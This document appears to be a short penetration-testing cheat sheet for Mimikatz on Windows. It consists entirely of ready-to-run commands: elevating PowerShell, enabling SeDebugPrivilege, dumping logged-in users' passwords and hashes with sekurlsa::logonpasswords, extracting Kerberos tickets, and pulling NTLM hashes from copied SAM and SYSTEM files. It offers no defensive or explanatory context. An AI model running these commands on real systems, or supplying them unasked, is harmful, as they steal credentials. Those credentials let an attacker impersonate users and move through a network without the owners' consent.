# Mimikatz

{% hint style="danger" %}
need to be a  local administrator
{% endhint %}

Run as administrator in powershell

```powershell
Start-Process powershell.exe -Verb RunAs
```

### Start mimikatz:

```powershell
.\mimikatz.exe
```

Enable SeDebugPrivilege:

```powershell
privilege::debug
```

### Dump hashes for logged in users

```powershell
sekurlsa::logonpasswords
```

### Extract kerberos tickets

```powershell
sekurlsa::tickets
```



{% code overflow="wrap" %}
```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
{% endcode %}





Get NLTM hashs from SAM files:

{% code overflow="wrap" %}
```powershell
.\mimikatz.exe "lsadump::sam /system:c:\temp\SYSTEM /sam:c:\temp\SAM" "exit"
```
{% endcode %}
